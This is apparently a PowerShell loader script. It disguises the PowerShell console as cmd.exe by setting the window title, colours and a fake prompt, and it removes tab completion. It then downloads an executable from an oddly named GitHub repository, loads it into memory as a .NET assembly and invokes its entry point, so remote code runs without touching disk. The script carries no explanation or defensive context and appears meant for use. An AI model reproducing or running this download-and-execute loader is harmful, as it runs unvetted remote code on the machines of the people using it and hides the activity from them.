$Host.UI.RawUI.WindowTitle = "cmd.exe"
$Host.UI.RawUI.ForegroundColor = "Gray"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

$Host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(120, 30)
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(120, 9999)

function prompt { "C:\Users\$env:USERNAME>" }

Remove-Item function:tabexp2 -ErrorAction SilentlyContinue
Remove-Item function:TabExpansion -ErrorAction SilentlyContinue

Clear-Host

$bytes = (New-Object System.Net.WebClient).DownloadData(
    "https://github.com/ousdhfoudhoudhgiu/45yh/raw/refs/heads/main/MemoryModule.net.exe"
)

$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)
